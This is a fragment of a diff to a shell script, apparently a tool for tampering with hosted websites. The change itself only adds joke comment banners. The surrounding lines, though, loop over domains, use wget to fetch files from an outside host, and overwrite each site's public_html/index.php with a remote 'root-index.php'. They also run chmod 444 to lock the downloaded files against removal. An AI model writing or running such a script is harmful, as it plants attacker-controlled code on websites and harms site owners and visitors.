@@ -150,8 +150,12 @@ do
     wget -q -O "$TARGET2" "$URL2"
     chmod 444 "$TARGET2"
 
+# 🐡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🐡
+#
 # 💰 "SEMUA TENTANG UANG!" 💰
 #               — Mr. Krabs 🦀
+#
+# 🐡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🐡
 
     TARGET3="/home/u200768895/domains/$DOMAIN/public_html/index.php"
     URL3="https://malam.545565.rest/spongebob/root-index.php"
